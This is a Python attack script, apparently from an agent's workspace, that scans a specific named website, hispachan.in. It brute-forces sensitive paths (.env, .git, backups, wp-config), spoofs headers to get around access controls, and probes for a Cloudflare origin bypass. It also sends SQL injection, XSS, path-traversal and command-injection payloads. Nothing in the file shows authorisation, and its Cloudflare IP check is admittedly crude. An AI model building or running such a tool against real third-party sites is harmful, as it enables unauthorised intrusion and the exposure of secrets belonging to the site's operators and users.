#!/usr/bin/env python3
import requests
import socket
import ssl
import subprocess
import json
import time
import random
import threading
import queue
import base64
import hashlib
from urllib.parse import urlparse, urljoin
import re
import sys

TARGET = "hispachan.in"
TARGET_URL = "https://hispachan.in/"

class AdvancedScanner:
    def __init__(self):
        self.session = requests.Session()
        self.results = {
            "vulnerabilities": [],
            "paths": [],
            "parameters": [],
            "headers": [],
            "cookies": [],
            "forms": [],
            "javascript": [],
            "api_endpoints": [],
            "bypass_methods": []
        }
        
    def test_http_methods(self):
        """Test different HTTP methods"""
        print("\n[+] Testing HTTP methods...")
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD', 'PATCH', 'TRACE', 'CONNECT']
        
        for method in methods:
            try:
                r = self.session.request(method, TARGET_URL, timeout=5, allow_redirects=False)
                if r.status_code not in [403, 405]:
                    print(f"  [!] {method}: {r.status_code}")
                    self.results["vulnerabilities"].append(f"Method {method} allowed: {r.status_code}")
            except:
                pass
    
    def test_headers_injection(self):
        """Test header injection vulnerabilities"""
        print("\n[+] Testing header injection...")
        
        test_headers = [
            ("Host", "evil.com"),
            ("X-Forwarded-Host", "evil.com"),
            ("X-Original-URL", "/admin"),
            ("X-Rewrite-URL", "/admin"),
            ("Referer", "https://admin.hispachan.in"),
            ("Origin", "null"),
            ("X-Custom-IP-Authorization", "127.0.0.1"),
            ("X-Forwarded-For", "127.0.0.1"),
            ("Client-IP", "127.0.0.1"),
            ("X-Real-IP", "127.0.0.1"),
            ("X-Originating-IP", "127.0.0.1"),
            ("X-Remote-IP", "127.0.0.1"),
            ("X-Remote-Addr", "127.0.0.1"),
            ("X-ProxyUser-Ip", "127.0.0.1"),
            ("X-Original-IP", "127.0.0.1"),
            ("X-Forwarded-Proto", "https"),
            ("X-Forwarded-Protocol", "ssl"),
            ("X-Forwarded-Ssl", "on"),
            ("X-Url-Scheme", "https"),
            ("Front-End-Https", "on"),
            ("X-Forwarded-Port", "443"),
            ("X-Forwarded-Server", "localhost"),
            ("X-Host", "localhost"),
            ("X-Original-Host", "localhost"),
            ("X-Backend-Host", "localhost"),
            ("X-Forwarded", "for=127.0.0.1;host=localhost;proto=https"),
            ("Forwarded", "for=127.0.0.1;host=localhost;proto=https")
        ]
        
        for header, value in test_headers:
            try:
                headers = {header: value, "User-Agent": "Mozilla/5.0"}
                r = self.session.get(TARGET_URL, headers=headers, timeout=5, allow_redirects=False)
                if r.status_code not in [403, 404]:
                    print(f"  [!] {header}: {value} -> {r.status_code}")
                    self.results["bypass_methods"].append((header, value, r.status_code))
            except:
                pass
    
    def discover_endpoints(self):
        """Discover API endpoints and hidden paths"""
        print("\n[+] Discovering endpoints...")
        
        wordlist = [
            # API endpoints
            "/api", "/api/v1", "/api/v2", "/api/v3", "/rest", "/graphql", "/query",
            "/api/users", "/api/login", "/api/auth", "/api/admin", "/api/config",
            "/api/status", "/api/health", "/api/metrics", "/api/debug", "/api/test",
            
            # Admin panels
            "/admin", "/administrator", "/panel", "/cpanel", "/webadmin", "/console",
            "/manager", "/control", "/dashboard", "/backend", "/backoffice",
            
            # Config files
            "/.env", "/.env.local", "/.env.production", "/config.json", "/config.php",
            "/settings.json", "/app.config", "/database.yml", "/parameters.yml",
            
            # Backup files
            "/backup", "/backups", "/backup.sql", "/dump.sql", "/database.sql",
            "/backup.tar.gz", "/backup.zip", "/site.zip", "/www.zip", "/htdocs.zip",
            
            # Source control
            "/.git", "/.git/config", "/.git/HEAD", "/.svn", "/.hg", "/.bzr",
            
            # Framework specific
            "/wp-admin", "/wp-login.php", "/wp-config.php", "/wp-content",
            "/joomla/administrator", "/drupal/admin", "/typo3/typo3",
            
            # Debug and info
            "/phpinfo.php", "/info.php", "/test.php", "/debug.php", "/server-status",
            "/server-info", "/elmah.axd", "/trace.axd", "/swagger", "/api-docs",
            
            # Hidden directories
            "/.well-known", "/.hidden", "/.secret", "/.private", "/hidden",
            "/secret", "/private", "/internal", "/dev", "/test", "/staging",
            
            # File extensions
            "/index.php.bak", "/index.php~", "/index.php.old", "/index.php.save",
            "/.htaccess", "/.htpasswd", "/web.config", "/crossdomain.xml"
        ]
        
        found = []
        for path in wordlist:
            try:
                url = TARGET_URL.rstrip('/') + path
                r = self.session.get(url, timeout=3, allow_redirects=False)
                if r.status_code not in [403, 404]:
                    print(f"  [!] Found: {path} -> {r.status_code}")
                    found.append((path, r.status_code))
                    self.results["paths"].append(path)
            except:
                pass
        
        return found
    
    def test_cloudflare_bypass(self):
        """Advanced Cloudflare bypass techniques"""
        print("\n[+] Testing advanced Cloudflare bypass...")
        
        # Method 1: Direct IP access
        try:
            # Try to find real IP through various methods
            print("  Testing direct IP access...")
            
            # Check SPF records for mail server IPs
            # Check historical DNS records
            # Check SSL certificates
            # Check error messages for IP leaks
            
        except:
            pass
        
        # Method 2: Origin exposure through subdomain
        print("  Testing subdomain origin exposure...")
        test_subdomains = [
            "direct", "origin", "real", "bypass", "cdn-bypass", "nocf",
            "stage", "staging", "dev", "development", "test", "testing",
            "uat", "demo", "preview", "beta", "alpha", "internal"
        ]
        
        for sub in test_subdomains:
            try:
                domain = f"{sub}.{TARGET}"
                ip = socket.gethostbyname(domain)
                # Check if IP is not Cloudflare
                if not self.is_cloudflare_ip(ip):
                    print(f"  [!] Non-CF subdomain found: {domain} -> {ip}")
                    self.results["bypass_methods"].append(("subdomain", domain, ip))
            except:
                pass
        
        # Method 3: Protocol downgrade
        try:
            print("  Testing protocol downgrade...")
            http_url = TARGET_URL.replace("https://", "http://")
            r = self.session.get(http_url, timeout=5, allow_redirects=False)
            if r.status_code != 403:
                print(f"  [!] HTTP accessible: {r.status_code}")
                self.results["bypass_methods"].append(("protocol", "http", r.status_code))
        except:
            pass
    
    def is_cloudflare_ip(self, ip):
        """Check if IP belongs to Cloudflare"""
        cf_ranges = [
            "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22",
            "103.31.4.0/22", "141.101.64.0/18", "108.162.192.0/18",
            "190.93.240.0/20", "188.114.96.0/20", "197.234.240.0/22",
            "198.41.128.0/17", "162.158.0.0/15", "104.16.0.0/13",
            "104.24.0.0/14", "172.64.0.0/13", "131.0.72.0/22"
        ]
        # Simplified check - in real scenario would check against all ranges
        return ip.startswith(("104.", "172.", "162.", "141."))
    
    def test_vulnerabilities(self):
        """Test for common vulnerabilities"""
        print("\n[+] Testing for vulnerabilities...")
        
        # SQL Injection test
        sqli_payloads = [
            "'", '"', "' OR '1'='1", '" OR "1"="1', "' OR 1=1--", "admin'--",
            "' UNION SELECT NULL--", "1' AND '1'='2", "1 AND 1=2"
        ]
        
        # XSS test
        xss_payloads = [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "javascript:alert(1)", "<svg onload=alert(1)>", "'><script>alert(1)</script>"
        ]
        
        # Path traversal
        traversal_payloads = [
            "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        # Command injection
        cmd_payloads = [
            "; ls", "| ls", "` ls`", "$(ls)", "&& ls", "|| ls"
        ]
        
        print("  Testing SQL injection...")
        for payload in sqli_payloads:
            try:
                url = f"{TARGET_URL}?id={payload}"
                r = self.session.get(url, timeout=3)
                if "error" in r.text.lower() or "sql" in r.text.lower():
                    print(f"    [!] Possible SQLi with: {payload}")
                    self.results["vulnerabilities"].append(("sqli", payload))
            except:
                pass
        
        print("  Testing XSS...")
        for payload in xss_payloads:
            try:
                url = f"{TARGET_URL}?search={payload}"
                r = self.session.get(url, timeout=3)
                if payload in r.text:
                    print(f"    [!] Possible XSS with: {payload}")
                    self.results["vulnerabilities"].append(("xss", payload))
            except:
                pass
    
    def extract_javascript_info(self):
        """Extract information from JavaScript files"""
        print("\n[+] Analyzing JavaScript files...")
        
        try:
            r = self.session.get(TARGET_URL)
            
            # Find JS files
            js_files = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\'"]', r.text)
            
            for js_file in js_files:
                js_url = urljoin(TARGET_URL, js_file)
                try:
                    js_content = self.session.get(js_url).text
                    
                    # Look for API endpoints
                    api_endpoints = re.findall(r'["\'](/api/[^"\']+)["\']', js_content)
                    for endpoint in api_endpoints:
                        print(f"  [!] API endpoint found: {endpoint}")
                        self.results["api_endpoints"].append(endpoint)
                    
                    # Look for sensitive info
                    if "api_key" in js_content.lower() or "secret" in js_content.lower():
                        print(f"  [!] Possible sensitive info in: {js_file}")
                        self.results["javascript"].append(js_file)
                    
                except:
                    pass
        except:
            pass
    
    def run_full_scan(self):
        """Run complete scan"""
        print("\n" + "="*60)
        print("ADVANCED VULNERABILITY SCANNER")
        print("="*60)
        
        self.test_http_methods()
        self.test_headers_injection()
        self.discover_endpoints()
        self.test_cloudflare_bypass()
        self.test_vulnerabilities()
        self.extract_javascript_info()
        
        print("\n" + "="*60)
        print("SCAN RESULTS")
        print("="*60)
        
        for key, values in self.results.items():
            if values:
                print(f"\n[*] {key.upper()}: {len(values)} found")
                for v in values[:5]:  # Show first 5
                    print(f"    - {v}")
        
        return self.results

def main():
    scanner = AdvancedScanner()
    results = scanner.run_full_scan()
    
    # Save results
    with open("/workspace/scan_results.json", "w") as f:
        json.dump(results, f, indent=2, default=str)
    
    print("\n[*] Results saved to scan_results.json")

if __name__ == "__main__":
    main()